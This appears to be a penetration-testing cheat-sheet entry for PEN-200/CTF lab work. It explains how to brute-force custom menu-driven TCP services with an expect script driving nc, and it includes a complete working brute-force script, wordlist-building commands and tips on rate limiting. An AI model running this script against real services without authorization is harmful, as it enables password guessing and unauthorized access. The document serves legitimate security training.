title: Custom TCP Service Brute Force — Expect Scripts
body:
Some lab boxes expose custom TCP services with menu-driven prompts that ask for answers, passwords, or codes. Hydra and crackmapexec don't speak these protocols — you write an expect script.

The pattern: connect, wait for menu, send command, wait for prompt, send guess, check response for 'Correct' vs 'Incorrect'. Most services close the connection on a wrong answer, so you reconnect per attempt.

When you'll need this:
  - PEN-200 'Sona' (NEXUS BACKUP MANAGER): zodiac sign + color → recovery password
  - Any custom service on a non-standard high port returning ASCII menus
  - CTF puzzle services
  - Banner says something nmap can't fingerprint, with `Please Enter X` prompts

The technique generalizes far beyond OSCP — anywhere you have a stateful TCP protocol you can script with `nc` + `expect`.
cmd:
# ══════════════════════════════════════════════════
# IDENTIFY THE PROTOCOL FIRST — talk to it manually
# ══════════════════════════════════════════════════
nc -nv $ip $port
# Note: exact menu text, what command to send, exact prompt for the answer,
# exact response on success vs failure, whether connection drops on Incorrect.
# This is your regex source material.

# Example for Sona's NEXUS BACKUP MANAGER:
#   - Menu shows after connect, ends with command list (ANSONE, ANSTWO, HINT, ...)
#   - Sending ANSONE → 'Please Enter Answer' prompt
#   - Sending guess → 'Correct' or 'Incorrect'
#   - 'HINT' command reveals: 'What is your zodiac sign?' / 'favorite color?'
#   - Connection DROPS after each Incorrect — must reconnect

# ══════════════════════════════════════════════════
# THE EXPECT SCRIPT TEMPLATE
# ══════════════════════════════════════════════════
# Save as brute.sh, chmod +x, run: ./brute.sh $ip $port wordlist.txt

#!/usr/bin/expect -f
set timeout 5
if {[llength $argv] < 3} {
    puts "Usage: $argv0 <ip> <port> <wordlist>"
    exit 1
}
set ip       [lindex $argv 0]
set port     [lindex $argv 1]
set wordlist [lindex $argv 2]

if {[catch {open $wordlist r} fh]} {
    puts "ERROR: cannot open '$wordlist'"; exit 1
}

set attempt 0
while {[gets $fh ans] != -1} {
    set ans [string trim $ans]
    if {$ans eq "" || [string index $ans 0] eq "#"} { continue }

    incr attempt
    puts -nonewline "\[$attempt\] $ans ... "; flush stdout

    log_user 0                                  ;# silence per-attempt nc chatter
    spawn -noecho nc -nvv $ip $port

    # wait for the menu — ADJUST REGEX to match your service
    expect {
        -re "NEXUS BACKUP MANAGER|Please Enter Answer" {}
        timeout { puts "TIMEOUT menu"; catch {close}; wait; continue }
        eof     { puts "EOF menu"; wait; continue }
    }

    # send the command that triggers the prompt
    send "ANSONE\r"

    # wait for the answer prompt
    expect {
        -re "Please Enter Answer" {}
        timeout { puts "no prompt"; catch {close}; wait; continue }
        eof     { puts "EOF prompt"; wait; continue }
    }

    send "$ans\r"

    expect {
        -re "Correct"          { log_user 1; puts "CORRECT"; puts "\n  >> $ans <<\n"; catch {close}; wait; close $fh; exit 0 }
        -re "Incorrect|Wrong"  { puts "incorrect" }
        eof                    { puts "EOF" }
        timeout                { puts "timeout" }
    }
    catch {close}; wait
}

puts "\n\[!\] Wordlist exhausted ($attempt attempts)"
close $fh
exit 1

# ══════════════════════════════════════════════════
# WORDLISTS TO TRY
# ══════════════════════════════════════════════════
# SecLists has lists for security-question style answers:
ls /usr/share/seclists/Miscellaneous/Security-Question-Answers/
#   colors.txt, html-colors.txt, us-states.txt, sports-teams.txt, etc.

# Find them by keyword:
locate seclists | grep -iE 'color|zodiac|sport|movie|food|state|city'
find /usr/share/seclists -iname '*color*'

# Build your own (12-line zodiac, all common cases):
printf 'Aries\nTaurus\nGemini\nCancer\nLeo\nVirgo\nLibra\nScorpio\nSagittarius\nCapricorn\nAquarius\nPisces\n' > /tmp/zodiac.txt
# Case variants — services are picky:
awk '{print; print tolower($0); print toupper($0)}' /tmp/zodiac.txt | sort -u > /tmp/zodiac-cases.txt

# ══════════════════════════════════════════════════
# COMMON FAILURE MODES
# ══════════════════════════════════════════════════
# 'spawn id not open' on the 2nd attempt:
#   Service drops on Incorrect. Move spawn INSIDE the while loop (template above).
#
# Hangs forever on first attempt:
#   Your menu regex doesn't match. Run nc manually, copy the literal text,
#   widen the regex. Use -nocase if needed.
#
# 'Correct' fires falsely:
#   Some services echo your input back. If you sent 'correct' as a guess,
#   the regex matches it. Use a more specific success pattern like 'Correct!'
#   or 'Access granted' that the service actually returns.
#
# Case sensitivity:
#   Try lowercase first, uppercase fallback. The case-variants awk trick above
#   triples your wordlist for ~zero cost.
#
# Rate limiting:
#   If a service starts dropping you after N attempts, add `sleep 1` between
#   tries. Most lab services don't, but if you see TIMEOUT clusters, slow down.
warn: Manual interaction first. If you can't repeatably get the service to respond the same way three times in a row from a fresh nc, your regex won't either. Five minutes of manual testing saves an hour of debugging the script.

choices.label: Service is fingerprint-failing in nmap — try targeted scan
Stuck identifying the protocol — try other angles
